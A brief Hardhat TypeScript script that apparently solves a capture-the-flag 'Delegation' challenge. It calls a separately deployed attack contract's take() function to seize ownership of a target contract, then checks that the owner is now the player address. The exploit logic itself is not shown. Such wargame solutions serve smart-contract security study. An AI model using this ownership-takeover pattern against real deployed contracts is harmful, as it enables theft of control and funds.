import { ethers } from "hardhat";
import { attack } from "../typechain-types";

const CONTRACT_ADDRESS = "0xe73bc5BD4763A3307AB5F8F126634b7E12E3dA9b"
const PLAYER_ADDRESS = "0xBcd4042DE499D14e55001CcbB24a551F3b954096"
const ATTACK_ADDRESS = "0xdbC43Ba45381e02825b14322cDdd15eC4B3164E6"

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS)
  const contract = await ethers.getContractAt("Delegation", CONTRACT_ADDRESS, signer)
  const attackContract = await ethers.getContractAt("DelegationAttack", ATTACK_ADDRESS, signer)

  await attackContract.take()
  console.log(await contract.owner() == PLAYER_ADDRESS)
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
